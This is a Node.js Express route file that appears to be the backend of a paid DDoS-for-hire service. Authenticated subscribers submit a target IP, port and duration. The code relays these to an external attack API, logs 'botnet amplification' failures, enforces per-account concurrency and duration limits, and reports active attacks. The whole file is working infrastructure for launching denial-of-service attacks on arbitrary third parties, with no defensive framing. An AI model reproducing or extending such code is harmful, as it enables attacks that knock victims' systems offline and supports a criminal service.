// routes/apiExternal.js - UPDATED with proper external API call
const express = require('express');
const router = express.Router();
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const { authenticateApiUser } = require('../middleware/apiAuthMiddleware');
const ApiUser = require('../models/ApiUser');
const attackTracker = require('../services/attackTracker');
const serveron = true
// Apply authentication middleware
router.use(authenticateApiUser);

// Attack endpoint
router.post('/attack', async (req, res) => {
    try {
        const { ip, port, duration } = req.body;
        const apiUser = req.apiUser;

        console.log(`[API Attack] User: ${apiUser.username}, Target: ${ip}:${port}, Duration: ${duration}s`);

        if (!serveron) {
            return res.status(403).json({
                error: 'server under maintainence',
            });
        }

        // Check expiration
        if (apiUser.isExpired()) {
            return res.status(403).json({
                error: 'Account has expired',
                expiresAt: apiUser.expiresAt,
                daysRemaining: 0
            });
        }

        // Validation
        if (!ip || !port || !duration) {
            return res.status(400).json({
                error: 'Missing required fields',
                required: ['ip', 'port', 'duration']
            });
        }

        const portNum = parseInt(port);
        const durationSec = parseInt(duration);

        if (isNaN(portNum) || portNum < 1 || portNum > 65535) {
            return res.status(400).json({ error: 'Invalid port. Must be between 1 and 65535' });
        }

        if (isNaN(durationSec) || durationSec < 1) {
            return res.status(400).json({ error: 'Invalid duration. Must be at least 1 second' });
        }

        // Check max duration limit
        if (durationSec > apiUser.limits.maxDuration) {
            return res.status(403).json({
                error: `Duration exceeds limit`,
                maxDuration: apiUser.limits.maxDuration,
                requestedDuration: durationSec
            });
        }

        // Clean expired attacks and get accurate count
        const currentActive = await apiUser.getActiveCount();

        // Check concurrent limit
        if (currentActive >= apiUser.limits.maxConcurrent) {
            return res.status(429).json({
                error: `Max concurrent attacks reached`,
                currentActive,
                maxConcurrent: apiUser.limits.maxConcurrent,
                message: `You have ${currentActive} active attacks. Maximum allowed: ${apiUser.limits.maxConcurrent}`
            });
        }

        const attackId = uuidv4();

        // ===== EXTERNAL API CALL =====
        // Get external API configuration from environment variables
        const externalApiUrl = process.env.API_URL || process.env.EXTERNAL_API_URL;
        const externalApiKey = process.env.API_KEY || process.env.EXTERNAL_API_KEY;

        if (!externalApiUrl) {
            console.error('[API Attack] External API URL not configured');
            return res.status(500).json({
                error: 'Service temporarily unavailable. Please contact support.',
                details: 'API endpoint not configured'
            });
        }

        if (!externalApiKey) {
            console.error('[API Attack] External API Key not configured');
            return res.status(500).json({
                error: 'Service configuration error. Please contact support.',
                details: 'API key not configured'
            });
        }

        console.log(`[API Attack] Calling external API: ${externalApiUrl}`);
        console.log(`[API Attack] Request payload:`, { param1: ip, param2: portNum, param3: durationSec });

        try {
            // Call external API with the exact format you specified
            const externalResponse = await axios.post(
                externalApiUrl,
                {
                    param1: ip,      // IP address
                    param2: portNum, // Port number
                    param3: durationSec  // Duration in seconds
                },
                {
                    headers: {
                        'Content-Type': 'application/json',
                        'x-api-key': externalApiKey
                    },
                    timeout: 15000,
                    validateStatus: (status) => true // Don't throw on any status
                }
            );

            console.log(`[API Attack] External API response status: ${externalResponse.status}`);
            console.log(`[API Attack] External API response data:`, externalResponse.data);

            // Check if external API call was successful (status 200)
            if (externalResponse.status !== 200) {
                console.error(`[API Attack] External API returned non-200 status: ${externalResponse.status}`);
                return res.status(500).json({
                    error: 'Failed to launch attack',
                    message: `External service returned status ${externalResponse.status}`,
                    details: 'Service temporarily unavailable'
                });
            }

            // Check the launched value in the response
            const launched = externalResponse.data?.launched;
            const total = externalResponse.data?.total;

            if (launched === 1) {
                // Attack was successfully launched
                console.log(`[API Attack] Attack successfully launched. Launched: ${launched}, Total: ${total}`);

                attackTracker.registerAttack({
                    target: ip,
                    port: portNum,
                    duration: durationSec,
                    username: apiUser.username,
                    userId: apiUser._id.toString(),
                    source: 'api'
                });

                // Track the attack in our database
                await apiUser.addActiveAttack(attackId, ip, portNum, durationSec);
                apiUser.totalRequests = (apiUser.totalRequests || 0) + 1;
                await apiUser.save();

                // Auto cleanup after duration
                setTimeout(async () => {
                    try {
                        const freshUser = await ApiUser.findById(apiUser._id);
                        if (freshUser) {
                            await freshUser.removeActiveAttack(attackId);
                            console.log(`[API Attack] Cleaned up attack ${attackId} for user ${apiUser.username}`);
                        }
                    } catch (err) {
                        console.error('[API Attack] Cleanup error:', err.message);
                    }
                }, durationSec * 1000);

                // Get updated count
                const newActiveCount = await apiUser.getActiveCount();

                // Return success response
                res.json({
                    success: true,
                    message: `Attack launched successfully against ${ip}:${port} for ${durationSec} seconds`,
                    attack: {
                        id: attackId,
                        target: ip,
                        port: portNum,
                        duration: durationSec,
                        endsAt: new Date(Date.now() + durationSec * 1000).toISOString(),
                        endsIn: `${durationSec} seconds`
                    },
                    limits: {
                        maxConcurrent: apiUser.limits.maxConcurrent,
                        maxDuration: apiUser.limits.maxDuration,
                        currentActive: newActiveCount,
                        remainingSlots: apiUser.limits.maxConcurrent - newActiveCount
                    },
                    account: {
                        username: apiUser.username,
                        status: apiUser.status,
                        expiresAt: apiUser.expiresAt,
                        daysRemaining: apiUser.getDaysRemaining()
                    }
                });

            } else if (launched === 0) {
                // Attack failed - amplification connection error
                console.error(`[API Attack] Attack failed - botnet amplification connection error. Launched: ${launched}, Total: ${total}`);

                // Check if there's an error message in the response
                const errorMessage = externalResponse.data?.message || externalResponse.data?.error || 'Error occurred during connection botnet amplification';

                return res.status(500).json({
                    error: 'Attack failed - Amplification connection error',
                    message: errorMessage,
                    details: {
                        launched: launched,
                        total: total,
                        reason: 'Unable to establish amplification connection'
                    }
                });

            } else {
                // Unexpected launched value
                console.error(`[API Attack] Unexpected launched value: ${launched}`);
                return res.status(500).json({
                    error: 'Failed to launch attack',
                    message: 'Invalid response from external service',
                    details: `Expected launched=0 or 1, got: ${launched}`
                });
            }

        } catch (externalError) {
            console.error('[API Attack] External API error:', externalError.message);
            if (externalError.response) {
                console.error('[API Attack] Response status:', externalError.response.status);
                console.error('[API Attack] Response data:', externalError.response.data);
            }

            res.status(500).json({
                error: 'Failed to launch attack',
                message: externalError.message,
                details: 'External service temporarily unavailable'
            });
        }

    } catch (error) {
        console.error('[API Attack] Internal error:', error);
        res.status(500).json({
            error: 'Internal server error',
            message: error.message
        });
    }
});
// Get active attacks
router.get('/active', async (req, res) => {
    try {
        const apiUser = req.apiUser;
        const activeCount = await apiUser.getActiveCount();

        res.json({
            success: true,
            activeAttacks: apiUser.activeAttacks.map(a => ({
                attackId: a.attackId,
                target: a.target,
                port: a.port,
                startedAt: a.startedAt,
                expiresIn: Math.max(0, Math.floor((a.expiresAt - Date.now()) / 1000))
            })),
            count: activeCount,
            maxConcurrent: apiUser.limits.maxConcurrent,
            remainingSlots: apiUser.limits.maxConcurrent - activeCount
        });
    } catch (error) {
        console.error('[API Active] Error:', error);
        res.status(500).json({ error: 'Failed to fetch active attacks' });
    }
});

// Get user stats
router.get('/stats', async (req, res) => {
    try {
        const apiUser = req.apiUser;
        const activeCount = await apiUser.getActiveCount();

        res.json({
            success: true,
            username: apiUser.username,
            email: apiUser.email,
            status: apiUser.status,
            isExpired: apiUser.isExpired(),
            expiresAt: apiUser.expiresAt,
            daysRemaining: apiUser.getDaysRemaining(),
            limits: apiUser.limits,
            stats: {
                totalAttacks: apiUser.totalAttacks || 0,
                totalRequests: apiUser.totalRequests || 0,
                currentActiveAttacks: activeCount,
                remainingSlots: apiUser.limits.maxConcurrent - activeCount
            }
        });
    } catch (error) {
        console.error('[API Stats] Error:', error);
        res.status(500).json({ error: 'Failed to fetch stats' });
    }
});

// Health check
router.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        version: '1.0.0'
    });
});

module.exports = router;